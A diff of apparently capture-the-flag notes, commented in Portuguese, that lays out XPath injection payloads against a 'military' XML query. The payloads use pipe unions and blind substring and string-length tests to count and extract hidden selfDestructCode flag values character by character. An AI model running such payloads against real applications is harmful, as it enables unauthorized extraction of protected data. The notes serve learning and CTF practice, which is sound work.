@@ -1,18 +1,31 @@
-# Testa o XPath Injection 
-/x[name='']|/military/district/staff[name='Straorg']
+# Query original
+/military[name='<este é o trecho sob nosso controle>'] ## Esta é a query que ele monta normalmente
+/military[name='Straorg'] ## Esta é a query que ele monta normalmente (Straorg é o trecho que podemos injetar)
 
-# Testa se as 5 primeiras letras são 'CHTB{' (de 'CHTB{senha}')
-/x[name='']|/military/district/staff[substring(selfDestructCode,1,5) = 'CHTB{']|/x[name='']
+## Esta é a query onde vamos testar o injection, precisa começar com ' e terminar com ']
+# Na query acima, injetamos um segundo bloco de consulta com o operador OU (pipe), sob controle do atacante, 
+# onde podemos incluir a query que quisermos. Neste caso, incluímos a mesma query original pra trazer um resultado.
+# Query Injetada: /military/district/rank[name='Captain'] # Procurando pelo rank ao invés do nome
+/military[name='']|/military/district/staff[rank='Captain']
 
-# Find the number of selfDestructCode nodes (2)
-/x[name='']|(/military/district/staff/selfDestructCode)[1]|/x[name='']
-/x[name='']|(/military/district/staff/selfDestructCode)[2]|/x[name='']
-/x[name='']|(/military/district/staff/selfDestructCode)[3]|/x[name='']
+# Vamos verificar se encontramos algum resultado no caminho da Flag
+# Neste caso, como a query não tem uma string, injetamos uma terceira query vazia no final
+## Query injetada: /military/district/staff/selfDestructCode
+/military[name='']|/military/district/staff/selfDestructCode|/military[name='']
 
-# Find the length of the selfDestructCode strings
+# Testa se as 5 primeiras letras de algum dos dois selfDestructCode são 'CHTB{' (de 'CHTB{senha}')
+## Query Injetada: /military/district/staff[substring(selfDestructCode,1,5) = 'CHTB{']
+/military[name='']|/military/district/staff[substring(selfDestructCode,1,5) = 'CHTB{']
+
+# Descobre o número de elementos 'selfDestructCode' - Confirma que são 2
+/military[name='']|(/military/district/staff/selfDestructCode)[1]|/military[name='']
+/military[name='']|(/military/district/staff/selfDestructCode)[2]|/military[name='']
+/military[name='']|(/military/district/staff/selfDestructCode)[3]|/military[name='']
+
+# Descobre o tamanho das strings selfDestructCode (flag) - no desafio, nós não recebemos a flag
 # [1] = 21 chars
 # [2] = 15 chars
-/x[name='']|(/military/district/staff/selfDestructCode)[2][string-length(text()) > 1]|x[name='']
+/military[name='']|(/military/district/staff/selfDestructCode)[2][string-length(text()) > 1]|x[name='']
 
-# Find the N'th char in the selfDestructCode string
-/x[name='']|(/military/district/staff/selfDestructCode)[1][substring(text(), 1, 1) = 'C']
+# Descobre o enésimo caractere da Flag
+/military[name='']|(/military/district/staff/selfDestructCode)[1][substring(text(), 1, 1) = 'C']
